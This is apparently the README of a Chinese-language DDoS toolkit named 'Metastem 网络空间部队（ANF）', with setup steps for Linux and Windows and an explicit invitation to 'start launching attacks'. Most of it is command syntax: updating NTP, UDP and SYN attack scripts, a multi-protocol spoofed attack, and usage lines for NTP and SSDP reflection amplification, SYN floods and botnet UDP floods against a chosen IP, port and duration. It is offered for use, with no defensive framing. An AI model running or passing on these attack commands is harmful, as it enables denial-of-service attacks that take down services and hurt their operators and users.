# Metastem 网络空间部队（ANF）

该脚本运行于 **Linux 系统**。  
`anf/server/` 目录为 **Windows 用户**准备，但运行需要配合一个**网页包发送服务器（Web Package Sender Server）**。

---

## 🐧 Linux 用户操作指南：

1. 将本项目上传至你的系统；
2. 打开终端，运行 `./anf` 启动程序；
3. 按照提示与示例，开始发起攻击！

---

## 🪟 Windows 用户操作指南：

1. 你需要拥有一个**包发送服务器（Package Sender Server）**；
2. 更新攻击脚本的命令如下：

- 更新 NTP 脚本：
  ```
  ./TFDDOS ntp update -1
  ```

- 更新 UDP 脚本：
  ```
  ./TFDDOS udp update -1
  ```

- 更新 SYN 脚本：
  ```
  ./TFDDOS syn update -1
  ```

- 进入攻击模式：
  ```
  sudo -i
  ```

- 自定义伪造攻击（多协议）：
  ```
  ./la us 100 ntp udp ssdp -1
  ```

---

## ☠️ 支持的攻击方式：

- **NTP 反射放大攻击（推荐）**：
  ```
  ./ntp {ip} {端口} ntp.txt 10 -1 {持续时间（秒）}
  ```

- **SSDP 反射攻击**：
  ```
  ./ssdp {ip} {端口} ssdp.txt 10 -1 {持续时间（秒）}
  ```

- **SYN Flood 攻击**：
  ```
  ./syn {ip} {端口} {持续时间（秒）}
  ```

- **UDP 僵尸网络泛洪攻击**（支持 botnet）：
  ```
  ./udp {ip} {端口} 10 888 -1 {持续时间（秒）}
  ```
